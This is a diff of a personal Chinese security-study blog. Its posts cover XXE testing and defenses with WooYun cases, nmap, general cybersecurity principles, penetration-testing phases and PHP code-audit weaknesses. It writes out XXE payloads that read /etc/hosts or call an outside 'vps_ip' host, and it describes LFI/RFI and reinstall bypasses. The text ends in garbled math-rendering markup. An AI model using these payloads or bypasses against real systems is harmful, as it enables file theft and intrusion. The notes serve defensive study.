+&lt;abc&gt;&amp;xxe;&lt;/abc&gt;
+</code></pre>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1626702695371.png" alt="" loading="lazy"><br>
+DDCTF——喝杯Java冷静下<br>
+http://116.85.48.104:5036/gd5Jq3XoKvGKqu5tIH2p/</p>
+<p>提示：第二层关卡应用版本号为2.3.1</p>
+<p>此题目有点难，由于技术不到位，有的地方不是很清楚就不误导读者了。</p>
+<p>直接看看大佬的姿势吧：</p>
+<p>DDCTF2018 WEB6 喝杯Java冷静下 WRITEUP —— LZ1Y</p>
+<p>DDCTF 2018 Web Writeup —— 白帽100安全攻防实验室</p>
+<p>真实案例<br>
+微信支付XXE漏洞 再提一次刚爆出的微信XXE漏洞，还可以欣赏一篇对此漏洞的修复文章。</p>
+<p>在线文件预览引起的问题，修改docx文件的word/document.xml，添加DTD和实体引用，即可触发，可据此生成恶意的Word文档。</p>
+<pre><code>[WooYun-2014-73321（网易邮箱某处XXE可读取文件）](http://www.anquan.us/static/bugs/wooyun-2014-073321.html)
+
+[WooYun-2014-73439（QQ邮箱XXE可读取任意文件）](http://www.anquan.us/static/bugs/wooyun-2014-073439.html)
+直接处理POST XML数据。许多都是直接 simplexml_load_string() 处理POST进来的数据。可控字符串出现在XML文件里就要引起注意。
+
+[WooYun-2015-109725（中通某处XXE漏洞可读取服务器任意文件）](http://www.anquan.us/static/bugs/wooyun-2015-0109725.html)
+</code></pre>
+<p>XML处理工具</p>
+<p>WooYun-2014-59911（从开源中国的某XXE漏洞到主站shell）格式化XML。</p>
+<p>WooYun-2015-134057（百度某平台Blind XXE漏洞&amp;可Bool型SSRF攻击）XML检查工具。</p>
+<p>WooYun-2015-135397（搜狗某平台Blind XXE漏洞(读取文件/SSRF/Struts2命令执行) XML检查工具。<br>
+WooYun-2014-58381（百度某功能XML实体注入）该功能点提供svg转jpg服务，通过构造特殊svg文件注入。</p>
+<p>WooYun-2014-59783（百度某功能XML实体注入（二））在第一次修复后只过滤了ENTITY这个词，DTD 本身就支持调用外部的DTD文件，因此我们只需要在svg里加一个外部的DTD就绕过了。</p>
+<p>WooYun-2014-74069（鲜果网RSS导入Blind XXE漏洞 ）导入OPML文件。</p>
+<p>WooYun-2015-111828（博客园某处XXE可下载任意文件）博客搬家功能，导入XML。</p>
+<p>WooYun-2015-117316（用友人力资源管理软件全版本XXE漏洞 ）登陆与重置密码时使用XML传输数据。</p>
+<p>WooYun-2015-148793（AOL Website XML External Entity(XXE) Vulnerability）xmlrpc service。</p>
+<p>WooYun-2015-156208（国际php框架slim架构上存在XXE漏洞（XXE的典型存在形式））服务端根据请求的 content-type 来区别对待提交的数据。application/x-www-form-urlencoded 、application/json 、application/xml 被用不同的方式解析。XML直接调用 simplexml_load_string 处理导致漏洞。有趣的是旧版本对该问题做了防范，新版本去除了相关代码，可能是觉得新版本对PHP版本需求在5.5以上。实际上PHP是否解析外部实体与本身版本无关，与编译时libxml库版本有关。</p>
+<p>WooYun-2016-168457（唯品会存在Blind XXE 漏洞）。作者说 关于XXE，觉得漏洞本身没太多的玩点，比较有意思主要在于：不同语言处理URI的多元化和不同XML解析器在解析XML的一些特性。 xfire是流行的webservice开发组件，其在invoke时使用了STAX解析XML导致XML实体注入发生 。乌云上一大波XXE洞都是这个，详细说明见 WooYun-2016-166751(Xfire文件读取漏洞)。</p>
+<p>WooYun-2014-59911（从开源中国的某XXE漏洞到主站shell）XXE读取到脚本文件/home/run/ssh_go.sh，内含SSH登陆密码。</p>
+<p>Revisting XXE and abusing protocols 【XXE+expect模块=&gt;Facbook RCE】</p>
+<p>XXE on Windows system …then what ?? 【XXE+SMB=&gt;内网RCE】</p>
+<p>Apache Solr XXE漏洞分析 【CVE-2018-8026】<br>
+XXE自动化工具<br>
+　　XXEinjector：一款功能强大的自动化XXE注射工具。</p>
+<p>本文就不具体演示、讲述此工具了。推荐一篇文章，详细的讲述了其使用方法，最后还附了XXEinjector工具的下载。</p>
+<p>寻找XXE<br>
+检测xml是否被解析</p>
+<p>尝试注入特殊字符，使XML失效，引发解析异常，明确后端使用XML传输数据。</p>
+<p>单双引号 ' &quot; ：XML的属性值必须用引号包裹，而数据可能进入标签的属性值。<br>
+尖括号&lt; &gt; ：XML的开始/结束标签用尖括号包裹，数据中出现尖括号会引发异常。<br>
+注释符&lt;!-- ：XML使用<!-- This is a comment -->作注释。<br>
+&amp; ：&amp; 用于引用实体。<br>
+<code>CDATA 分隔符]]&gt; ：&lt;![CDATA[foo]]&gt;</code>中的内容不被解析器解析，提前闭合引发异常。<br>
+检测是否支持外部实体解析</p>
+<p>尝试利用实体和DTD。</p>
+<pre><code>引用外部DTD文件访问内网主机/端口 ：&lt;!DOCTYPE a SYSTEM &quot;http://127.0.0.1:2333&quot;&gt;（看响应时间）
+引用外部DTD文件访问外网 ：&lt;!DOCTYPE a SYSTEM &quot;http://vps_ip&quot; &gt;
+引用内部实体 ：&lt;!DOCTYPE a [&lt;!ENTITY xxe &quot;findneo&quot;&gt;]&gt;&lt;a&gt;&amp;xxe;&lt;/a&gt;
+外部实体读本地文件 ：&lt;!DOCTYPE a [&lt;!ENTITY xxe SYSTEM &quot;file:///etc/hosts&quot;&gt;]&gt;&lt;a&gt;&amp;xxe;&lt;/a&gt;
+外部实体访问内网主机/端口 ：&lt;!DOCTYPE a SYSTEM &quot;http://192.168.1.2:80&quot;&gt;（看响应时间）
+外部实体访问外网 ：&lt;!DOCTYPE a [&lt;!ENTITY xxe SYSTEM &quot;http://vps_ip&quot;&gt;]&gt;&lt;a&gt;&amp;xxe;&lt;/a&gt;
+</code></pre>
+<p>判断问题存在可以OOB提取数据。<br>
+XXE的防御<br>
+使用开发语言提供的禁用外部实体的方法<br>
+　　PHP</p>
+<p>libxml_disable_entity_loader(true);</p>
+<p>JAVA</p>
+<p>DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();</p>
+<p>dbf.setExpandEntityReferences(false);</p>
+<p>Python</p>
+<p>from lxml import etree xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</p>
+<p>过滤用户提交的XML数据<br>
+　　过滤关键词：&lt;!DOCTYPE和&lt;!ENTITY，或者SYSTEM和PUBLIC。</p>
+<p>参考资料<br>
+http://www.freebuf.com/column/156863.html<br>
+https://security.tencent.com/index.php/blog/msg/69<br>
+https://xz.aliyun.com/t/2571#toc-10<br>
+http://www.w3school.com.cn/dtd/<br>
+大家有任何问题可以提问，更多文章可到i春秋论坛阅读哟~<br>
+来自FreeBuf.COM</p>
+<h1 id="2021-07-20">2021-07-20</h1>
+<p>#nmap的使用方法<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1626736650861.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1626736653159.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1626736655496.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1626736657736.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1626736660130.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1626736662968.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1626736665551.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1626736668085.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1626736670425.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1626736673446.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1626736677060.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1626736679820.png" alt="" loading="lazy"></p>
+<p>#什么是网络安全？<br>
+就像物理安全旨在保护人身财产和人员免受犯罪活动或意外损坏一样，网络安全保护计算机系统、后端系统和最终用户应用程序、这些系统的用户以及他们存储的数据。</p>
+<p>网络安全旨在防止网络罪犯、恶意内部人员或其他人员访问、伤害、破坏或修改 IT 系统和应用程序。</p>
+<p>网络安全的重要性<br>
+随着人类社会数字化，我们生活的方方面面都得益于网络、计算机和其他电子设备以及软件应用。包括医疗保健、金融机构、政府和制造业在内的关键基础设施都使用计算机或智能设备作为其运营的核心部分。这些设备绝大多数连接到互联网。</p>
+<p>威胁行为者比以往更有动力去寻找渗透这些计算机系统的方法，以谋取经济利益、敲诈勒索、政治或社会动机（称为黑客主义），或者仅仅是故意破坏。</p>
+<p>在过去二十年中，针对所有发达国家的关键基础设施发动了网络攻击，无数企业遭受了灾难性的损失。全球每年有超过 2，000 起已确认的数据泄露事件，每次泄露平均花费超过 390 万美元（美国为 810 万美元）。自2000年以来，超过35亿人（占世界人口的一半）的私人信息被网络罪犯窃取。</p>
+<p>安全漏洞和威胁几乎会影响任何系统，包括：<br>
+通信——电话、电子邮件、短信和消息应用程序都可以用于网络攻击<br>
+金融——当然，金融机构是攻击者的主要目标，任何处理银行或信用卡信息的组织都处于危险之中<br>
+政府——政府机构通常成为网络罪犯的目标，他们可能追求公民个人信息或机密公共数据<br>
+交通——互联汽车、交通控制系统和智能道路基础设施都面临网络威胁的风险<br>
+医疗保健——从当地诊所的医疗记录到国家医院的重症监护系统，任何疾病都容易受到攻击<br>
+教育机构、其机密的研究数据以及他们掌握的关于学生或教职员工的信息都面临受到攻击的风险<br>
+在这些系统中，绝大多数网站和 Web 应用程序都是攻击者的网关。它们暴露在公共互联网上，通常连接到敏感的后端系统，是该组织安全战略中的一个薄弱环节</p>
+<p>无论您的组织是任何规模的企业、接收大量流量的网站，还是为公共利益服务的机构或非营利组织，准备和抵御网络安全威胁都应该是您最关心的问题之一。</p>
+<p><strong>网络安全原则</strong><br>
+网络安全的主要目标是保护数据。安全界通常指确保数据安全的三角形，称为 CIA 三合会：</p>
+<p>保密性——确保敏感数据仅对实际需要的人访问，并允许根据组织政策访问，同时阻止访问他人。<br>
+完整性-确保数据和系统不会因为威胁行为者的行为或意外修改而进行修改。应采取措施防止腐败或丢失敏感数据，并在发生此类事件时迅速恢复。<br>
+可用性-确保数据仍然可用，对其最终用户有用，并确保此访问不会因系统故障、网络攻击甚至安全措施本身而受阻。<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1626740013759.png" alt="" loading="lazy"><br>
+中情局三合会定义了数据安全的三项关键原则</p>
+<p>为了实现中情局的目标，组织必须保护两个方面或其 IT 环境：应用安全和数据安全。</p>
+<p><strong>通用应用安全策略</strong><br>
+应用程序安全性可确保面向用户的应用程序免受外部威胁、对托管或使用应用程序（端点）的设备的攻击以及内部威胁的渗透或破坏。以下是三种最常见的应用安全策略。</p>
+<p><strong>DDoS保护</strong></p>
+<p>分布式拒绝服务 （DDoS） 攻击使用攻击者控制的大量连接设备，用虚假流量淹没网站的资源。由于当今 DDoS 攻击的规模很大，因此常见的保护措施是基于云的 DDoS 缓解服务。这些服务使用 DNS 或 BGP 路由将流量转移到基于云的擦洗服务器、删除恶意请求并将合法请求转发到 Web 服务器。</p>
+<p><strong>Web 应用程序防火墙</strong></p>
+<p>网络应用防火墙 （WAF） 部署在网络边缘作为反向代理，检查网络应用程序的传入和出站 HTTP/S 流量，并过滤掉恶意流量。WAF 使用安全策略和威胁情报数据（如已知的不良流量源和已知的攻击模式）来确定哪些流量不应到达应用程序。</p>
+<p><strong>高级机器人保护</strong></p>
+<p>机器人是通过互联网执行操作的自动化程序。有些机器人是合法的，应该允许访问网站，而其他机器人是恶意的，可用于发起自动攻击。机器人管理是一个快速发展的领域，它使用机器人声誉数据库保护组织免受不良机器人的伤害，挑战测试机器人是否是真正的用户，以及识别可疑机器人行为的行为分析。</p>
+<p><strong>通用数据安全策略</strong><br>
+数据安全可确保外部方或未经授权的内部方无法访问数据，识别敏感数据的风险并解决这些风险，并设置检测方法以识别威胁行为者何时访问、修改或删除数据。以下是数据安全的三种常见策略。</p>
+<p><strong>数据屏蔽</strong></p>
+<p>许多数据泄露不是发生在生产环境中，而是发生在测试或 DevOps 环境中。这些环境通常不安全，但通常加载实时、敏感的客户数据。数据屏蔽使在测试服务器上使用逼真的数据成为可能，同时使用转换技术隐藏或争夺原始数据。</p>
+<p><strong>漏洞发现</strong></p>
+<p>许多软件系统都存在漏洞，黑客可能会利用这些漏洞来破坏系统。漏洞发现是一个依赖于漏洞数据库的过程，其中包含有关已知漏洞的详细信息。它允许组织检测哪些系统受到漏洞的影响，了解严重性和影响，并修复漏洞。</p>
+<p><strong>端点安全</strong></p>
+<p>组织中的端点设备数量正在爆炸式增长。有数百万台笔记本电脑、移动设备和物联网 （IoT 设备） 连接到互联网，并代表着日益严重的安全风险。</p>
+<p>端点安全包括在每个端点部署代理，该代理可以提供下一代防病毒 （NGAV） 等安全功能，以检测零日攻击和内部威胁，以及端点检测和响应 （EDR），以帮助安全团队实时调查和阻止端点上的攻击。</p>
+<p><strong>常见的网络威胁</strong><br>
+网络安全形势复杂，数百万已知的威胁参与者和有案可查的战术、技术和程序 （TTP） 以及每天都在出现新型攻击。以下是您可能遭受的一些更常见的网络威胁：</p>
+<p>威胁	        工作原理	对您的组织的风险<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1626740233802.png" alt="" loading="lazy"><br>
+<strong>构建网络安全战略</strong><br>
+解决组织中的网络安全问题始于战略，该战略应得到高级管理层的支持，并与整个组织共享。</p>
+<p>下面是一个可用于构建安全策略的过程：</p>
+<p>1.执行计算资产清单-确定您的组织拥有哪些应用程序和数据，以及如果它们受到攻击或破坏的后果。创建需要保护的资产列表。<br>
+2.确定合规性要求——您的组织是否遵守任何影响网络安全的法规或行业标准？识别与网络安全相关的合规要求，并将它们添加到受保护资产列表中。<br>
+3.识别威胁和风险-审查影响您行业的威胁的全面列表，确定其中哪一个对您的组织最相关，并审查关键系统，以了解它们对攻击的脆弱程度。例如，运营网站的组织应关注网络应用程序威胁（如代码注入和恶意机器人），并对其 Web 应用程序进行评估，以了解其易受攻击性。<br>
+4.优先考虑风险——鉴于您需要保护的系统、合规责任和常见威胁，请确定您面临的最大风险。哪些系统对企业最有价值，最有可能受到攻击？这是您应该针对您的网络安全计划的第一个风险。<br>
+5.确定您的安全成熟度水平和现有模子——您的公司有网络安全计划吗？是否有内部工作人员或现有供应商提供安全服务？此外，还绘制出已经存在的网络安全措施。考虑保护物理设施（保安、服务器室锁着的门）、防火墙和防病毒等安全系统，以及组织使用的应用程序和服务（包括云服务）的安全措施。<br>
+6.建立一个网络安全团队——利用组织中的现有员工，提高网络安全技能，雇佣新员工，并在必要时聘请顾问。创建一个有能力的团队，能够执行网络安全计划，以改善您的安全态势。<br>
+7.为改善网络安全制定时间表和里程碑——您可以立即执行哪些快速胜利来改进对关键系统的保护？哪些长期措施需要更多时间，但对改善网络安全非常重要？制定至少 1-2 年的长期计划，每个季度都有明确的里程碑，表明安全团队应该实现什么目标。</p>
+<p>7 网络安全趋势<br>
+以下是网络安全社区中的重要趋势，您应该意识到这些趋势，因为您正在制定战略并选择您的工具集。</p>
+<p><strong>1.网络安全和机器学习</strong><br>
+过去，网络安全系统依靠手动定义的规则和人工检查来识别和分类安全事件。这是有效的，但有限，因为它需要高水平的专业知识来管理安全工具，并超载的安保人员。</p>
+<p>许多现代安全工具使用机器技术实现安全决策自动化，而无需事先定义规则。这可以为安全团队节省大量时间，并导致对威胁做出更快、更准确的响应。</p>
+<p>在网络安全中使用机器学习的几个例子是：</p>
+<p>下一代防病毒 （NGAV）工具使用自动恶意软件分类，即使恶意软件与任何已知的二进制模式不匹配，也要识别恶意软件<br>
+数据丢失预防 （DLP）系统使用机器学习读取文档或其他材料，并自动对其灵敏度进行分类<br>
+电子邮件保护系统使用大量网络钓鱼与合法电子邮件的数据集进行培训，并且可以识别&quot;看起来像&quot;他们可能正在进行网络钓鱼尝试的电子邮件</p>
+<p><strong>2.API 安全</strong><br>
+应用程序编程接口 （API） 允许计算系统相互通信和共享数据。整个 API 经济已经出现，允许组织相互共享数据和软件功能。</p>
+<p>虽然 API 为组织提供了很大的价值，但它们也代表着安全风险。对 API 安全重要性的认识有限，许多 API 端点缺乏基本的安全措施。攻击者可以操纵它们滥用 API 背后的服务，也可以成为组织关键系统的切入点。</p>
+<p>在过去几年中，专门的 API 安全解决方案不断涌现，帮助组织锁定 API 端点、保护它们免受恶意流量的侵害，并抵御 DDoS 攻击。OpenAPI计划可帮助组织以标准化的方式定义其 API，从而能够执行建立在 API 功能基础上的安全政策。</p>
+<p><strong>3.高级机器人保护</strong><br>
+机器人是访问网站并执行自动操作的系统。例如，一些机器人是合法的，谷歌机器人爬行网站，以便将其添加到谷歌的搜索索引中。但其他机器人是恶意的，被威胁行为者用来对数百万个易受攻击的网站发起攻击。</p>
+<p>机器人占当今网络流量的 58%，而整个22% 的 Web 流量归因于不良机器人。坏机器人可以安装在被攻击者破坏的最终用户设备上，形成巨大的僵尸网络。这些设备可能是家用电脑、服务器和物机设备，如游戏机或智能电视。 攻击者利用受损设备网络发动DDoS和许多其他类型的攻击。</p>
+<p>机器人管理系统帮助组织识别不需要的机器人流量并将其过滤掉，同时允许合法的机器人流量和用户流量继续不间断。为此，他们需要使用各种方法（如：</p>
+<p>声誉管理——管理已知的好坏机器人数据库<br>
+设备指纹-识别操作系统或浏览器的属性，可能表示一个坏的机器人<br>
+挑战——使机器人面临&quot;挑战&quot;，如动态页面元素或 CAPTCHA，人类用户能够处理这些内容，而机器人则无法处理这些挑战。</p>
+<p><strong>4.文件安全</strong><br>
+文件安全对于确保未经授权的各方（无论是内部还是外部）没有访问或篡改敏感数据至关重要。许多合规性标准要求组织对敏感数据文件实施严格控制，证明这些控制已经到位，并在发生违规时显示文件活动的审计跟踪。</p>
+<p>文件安全技术可以自动识别可疑文件活动，这可能表示对数据渗透、勒索软件攻击的尝试，甚至是粗心大意的用户错误地删除文件或将其复制到不安全的位置。</p>
+<p><strong>5.运行时应用程序自我保护</strong><br>
+从历史上看，许多组织采用了应用程序安全测试 （AST） 工具，这些工具会自动扫描应用程序代码以发现代码质量问题和软件漏洞。今天，许多组织正在转向 Runtime 应用程序自我保护 （RASP），该保护程序在生产中运行时实时扫描和监控应用程序代码。</p>
+<p>RASP 与 Web 应用程序一起部署。它监控流量和用户行为，如果检测到问题，它可以阻止特定的用户请求并提醒安全人员。RASP 不依赖于特定的攻击签名，并且能够阻止所有类别的攻击。</p>
+<p>RASP 的独特元素是，它利用了应用程序源代码的内部知识。它知道应用程序的行为方式，并可以检测利用代码中的弱点（如代码注入和对已知漏洞的漏洞）的攻击。</p>
+<p><strong>6.云安全</strong><br>
+随着组织进行数字化转型并将任务关键工作量转移到云中，云安全成为网络安全战略的重要组成部分。保护云是一项挑战，因为基于云的系统没有传统的安全周长，并且可以让攻击者访问 IT 环境的几乎所有方面。</p>
+<p>组织必须了解自己与其云提供商之间的责任划分，并正确配置云提供商提供的安全功能，特别是虚拟私有云 （VPC） 等网络隔离功能。他们还必须有一个强大的身份和访问管理 （IAM） 解决方案 - 定义用户帐户、角色和访问控制策略的方法。</p>
+<p>在部署连接私有云和公共云或多个公共云之间的混合云或多云基础设施时，组织必须确保所有云环境中的安全性一致，并特别注意集成点。</p>
+<p><strong>7.警报疲劳</strong><br>
+组织从 IT 系统和安全工具收集大量日志和事件。现在，即使在中小型组织中，使用安全信息和事件管理 （SIEM） 来聚合安全数据并为安全团队创建警报也是很常见的。</p>
+<p>警报数量之多，加上许多组织长期缺乏安保人员，导致警报疲劳。安全团队在一天的所有时间都会收到数千个警报，因此很难筛选警报并识别真正的安全事件。</p>
+<p>这个问题并不新鲜，有几种方法可以减轻警报疲劳。例如，组织实施威胁情报，以识别警报何时与已知攻击者的签名或攻击模式相关联。计算机学习方法（如用户和事件行为分析 （UEBA）有助于识别异常行为，并自动评分以识别更有可能是恶意的事件。</p>
+<p>#渗透测试阶段<br>
+笔测试过程可分为五个阶段。<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1626740467866.png" alt="" loading="lazy"><br>
+1.规划和侦察<br>
+第一阶段涉及：</p>
+<p>定义测试的范围和目标，包括要处理的系统和要使用的测试方法。<br>
+收集情报（例如网络和域名、邮件服务器），以更好地了解目标的工作原理及其潜在漏洞。<br>
+2.扫描<br>
+下一步是了解目标应用程序将如何响应各种入侵尝试。这通常是使用：</p>
+<p>静态分析–检查应用程序的代码，以估计其运行时的行为方式。这些工具可以在单次传递中扫描整个代码。<br>
+动态分析–在运行状态下检查应用程序的代码。这是一种更实用的扫描方法，因为它为应用程序的性能提供了实时视图。<br>
+3.获取访问<br>
+本阶段使用 Web 应用程序攻击，如跨站点脚本、SQL 注射和后门，以发现目标的漏洞。然后，测试人员尝试利用这些漏洞，通常是通过升级权限、窃取数据、拦截流量等来了解它们可能造成的损害。</p>
+<p>4.维护访问<br>
+这一阶段的目标是看看漏洞是否可以用于在被利用的系统中实现持久存在-足够长的时间让不良行为者获得深入访问。其理念是模仿先进的持续威胁，这些威胁通常在系统中停留数月，以便窃取组织最敏感的数据。</p>
+<p>5.分析<br>
+渗透测试的结果随后汇编成一份报告，详细说明：</p>
+<p>被利用的特定漏洞<br>
+已访问的敏感数据<br>
+笔测试员在未检测到的情况下在系统中停留的时间<br>
+安全人员会分析此信息，以帮助配置企业的 WAF 设置和其他应用安全解决方案，以修补漏洞并防止未来的攻击。</p>
+<p><strong>渗透测试方法</strong><br>
+外部测试<br>
+外部渗透测试针对的是互联网上可见的公司资产，例如 Web 应用程序本身、公司网站以及电子邮件和域名服务器 （DNS）。目标是访问和提取有价值的数据。</p>
+<p>内部测试<br>
+在内部测试中，能够访问防火墙后面应用程序的测试人员模拟恶意内部人员的攻击。这不一定是模拟流氓员工。常见的起始场景可能是其凭据因网络钓鱼攻击而被盗的员工。</p>
+<p>盲测试<br>
+在盲目测试中，测试者只给出被攻击企业的名称。这使安全人员能够实时了解实际应用攻击将如何发生。</p>
+<p>双盲测试<br>
+在双重盲测试中，安全人员事先并不知道模拟攻击。与现实世界一样，在试图突破之前，他们将没有时间加强防御。</p>
+<p><strong>有针对性的测试</strong><br>
+在这种情况下，测试人员和安全人员协同工作，并相互评估他们的动作。这是一个有价值的培训练习，为安全团队提供来自黑客观点的实时反馈。</p>
+<p><strong>渗透测试和 Web 应用程序防火墙</strong><br>
+渗透测试和 WAF 是排他性的，但互利的安全措施。</p>
+<p>对于多种笔试（盲和双盲测试除外），测试人员可能会使用 WAF 数据（如日志）来定位和利用应用程序的弱点。</p>
+<p>反过来，WAF 管理员可以从笔测试数据中受益。测试完成后，可以更新 WAF 配置，以抵御测试中发现的弱点。</p>
+<p>最后，笔测试满足了安全审核程序的某些合规性要求，包括PCI DSS和SOC 2。某些标准，如PCI-DSS 6.6，只能通过使用经过认证的WAF来满足。然而，这样做并没有使笔测试有任何少用，因为它的上述好处和能力，以改善WAF配置。</p>
+<p>#php代码审计</p>
+<p><strong>安装的问题：</strong><br>
+1自动删除这个安装的文件：通过生成一个lock文件，来判断程序是否安装过<br>
+2根本无验证：安装完成后不会自动删除文件，又不会生成lock判断是否安装过<br>
+3安装file：直接用get提交step2那么就直接进入下一步<br>
+4变量覆盖导致重装：可以get，port，cookie任意提交一个变量名$insLockfile,给其赋空值，覆盖掉这个变量inslockfile从而让file_exists为false就不会退出<br>
+5判断lock后，无exit：判断是否存在lock文件，如果存在lock文件，jiuhuiheader到index.php但<br>
+是header后并没有exit，所以不会退出，类似的还有javascript弹个框<br>
+6解析漏洞：在安装完成后会将install.php rename为install.php.bak但是由于apache的解析漏洞，如果无法识别最后一个后缀的话，就会向上解析，那么就会又生成php了,然后结合安装时的变量覆盖又成重装了</p>
+<p><strong>包含漏洞</strong><br>
+LFI：很多都限制了包含的后缀结尾必须为.php,例如include($a.'.php'),需要阶段后面的这.php<br>
+1.00截断=gpc off &amp;&amp; php &lt; 5.3.4<br>
+2.长文件名截断<br>
+3.转换字符集造成的截断--<code>&lt;iconv()截断&gt;</code><br>
+4.伪协议：截取字符判断是不是.php,用zip或者phar协议绕过：首先新建一个1.php，里卖弄phpinfo，然后压缩成.zipranhoubazip的名字改成yu.jpg，然后把这个.jpg上传上去然后包含<br>
+5.包含日志环境变量</p>
+<p>RFI：包含远程文件或者为协议php://input data等<br>
+条件allow_url_include on默认off<br>
+allow_url_include off 条件下RFI：allow_url_include为on，allow_url_fopen为off 伪协议<img src="https://jinqipiaopiao.github.io//post-images/1626748376060.png" alt="" loading="lazy"><br>
+allow_url_include&amp;&amp;allow_url_fopen为off：包含共享文件<img src="https://jinqipiaopiao.github.io//post-images/1626748436559.png" alt="" loading="lazy">，互联网上445端口基本上被过滤<br>
+allow_url_fopen默认on</p>
+<p><strong>找回密码</strong><br>
+验证token：再找回密码的时候生成一个token，然后存储到数据库中，然后把找回密码的地址发到邮件中url中就含有token由用户点开后就能修改密码<br>
+延申：yixiecms的密码解密方式很难解，有时拿到了管理的密码破不掉，利用方法：一般找回密码使用的邮箱，首先吧管理的邮箱注入出来，然后再回去找密码，再把数据库的token注入出来，构造以下地址，就能进行重置密码<br>
+rand函数生成token：<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>r</mi><mi>e</mi><mi>s</mi><mi>e</mi><mi>t</mi><mi>p</mi><mi>w</mi><mi>d</mi><mo>=</mo><mi>m</mi><mi>d</mi><mn>5</mn><mo>(</mo><mi>r</mi><mi>a</mi><mi>n</mi><mi>d</mi><mo>(</mo><mo>)</mo><mo>)</mo><mo separator="true">;</mo><mi mathvariant="normal">：</mi><mi mathvariant="normal">对</mi><mi>r</mi><mi>a</mi><mi>n</mi><mi>d</mi><mi mathvariant="normal">（</mi><mi mathvariant="normal">）</mi><mi mathvariant="normal">函</mi><mi mathvariant="normal">数</mi><mi mathvariant="normal">生</mi><mi mathvariant="normal">成</mi><mi mathvariant="normal">出</mi><mi mathvariant="normal">来</mi><mi mathvariant="normal">的</mi><mi mathvariant="normal">数</mi><mi mathvariant="normal">字</mi><mi mathvariant="normal">进</mi><mi mathvariant="normal">行</mi><mi>m</mi><mi>d</mi><mn>5</mn><mi mathvariant="normal">，</mi><mi mathvariant="normal">某</mi><mi mathvariant="normal">些</mi><mi mathvariant="normal">平</mi><mi mathvariant="normal">台</mi><mi mathvariant="normal">下</mi><mi mathvariant="normal">例</mi><mi mathvariant="normal">如</mi><mi mathvariant="normal">（</mi><mi>w</mi><mi>i</mi><mi>n</mi><mi>d</mi><mi>o</mi><mi>w</mi><mi>s</mi><mi mathvariant="normal">）</mi><mi>r</mi><mi>a</mi><mi>n</mi><msub><mi>d</mi><mi>m</mi></msub><mi>a</mi><mi>x</mi><mi mathvariant="normal">只</mi><mi mathvariant="normal">有</mi><mn>32768</mn><mi mathvariant="normal">，</mi><mi mathvariant="normal">如</mi><mi mathvariant="normal">果</mi><mi mathvariant="normal">需</mi><mi mathvariant="normal">要</mi><mi mathvariant="normal">的</mi><mi mathvariant="normal">范</mi><mi mathvariant="normal">围</mi><mi mathvariant="normal">大</mi><mi mathvariant="normal">于</mi><mi mathvariant="normal">这</mi><mi mathvariant="normal">个</mi><mi mathvariant="normal">数</mi><mi mathvariant="normal">字</mi><mi mathvariant="normal">，</mi><mi mathvariant="normal">那</mi><mi mathvariant="normal">么</mi><mi mathvariant="normal">指</mi><mi mathvariant="normal">定</mi><mi>m</mi><mi>i</mi><mi>n</mi><mi mathvariant="normal">和</mi><mi>m</mi><mi>a</mi><mi>x</mi><mi mathvariant="normal">参</mi><mi mathvariant="normal">数</mi><mi mathvariant="normal">就</mi><mi mathvariant="normal">可</mi><mi mathvariant="normal">以</mi><mi mathvariant="normal">生</mi><mi mathvariant="normal">成</mi><mi mathvariant="normal">大</mi><mi mathvariant="normal">于</mi><mi mathvariant="normal">这</mi><mi mathvariant="normal">个</mi><mi mathvariant="normal">数</mi><mi mathvariant="normal">字</mi><mi mathvariant="normal">的</mi><mi mathvariant="normal">数</mi><mi mathvariant="normal">了</mi><mi mathvariant="normal">，</mi><mi mathvariant="normal">或</mi><mi mathvariant="normal">者</mi><mi mathvariant="normal">考</mi><mi mathvariant="normal">虑</mi><mi mathvariant="normal">哟</mi><mi mathvariant="normal">个</mi><mi>m</mi><msub><mi>t</mi><mi>r</mi></msub><mi>a</mi><mi>n</mi><mi>d</mi><mi mathvariant="normal">（</mi><mi mathvariant="normal">）</mi><mi mathvariant="normal">来</mi><mi mathvariant="normal">替</mi><mi mathvariant="normal">代</mi><mi mathvariant="normal">它</mi><mi mathvariant="normal">‘</mi></mrow><annotation encoding="application/x-tex">resetpwd=md5(rand());：对rand（）函数生成出来的数字进行md5，某些平台下例如（windows）rand_max只有32768，如果需要的范围大于这个数字，那么指定min和max参数就可以生成大于这个数字的数了，或者考虑哟个mt_rand（）来替代它
+`</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">e</span><span class="mord mathdefault">s</span><span class="mord mathdefault">e</span><span class="mord mathdefault">t</span><span class="mord mathdefault">p</span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mord mathdefault">d</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">m</span><span class="mord mathdefault">d</span><span class="mord">5</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">a</span><span class="mord mathdefault">n</span><span class="mord mathdefault">d</span><span class="mopen">(</span><span class="mclose">)</span><span class="mclose">)</span><span class="mpunct">;</span><span class="mspace" 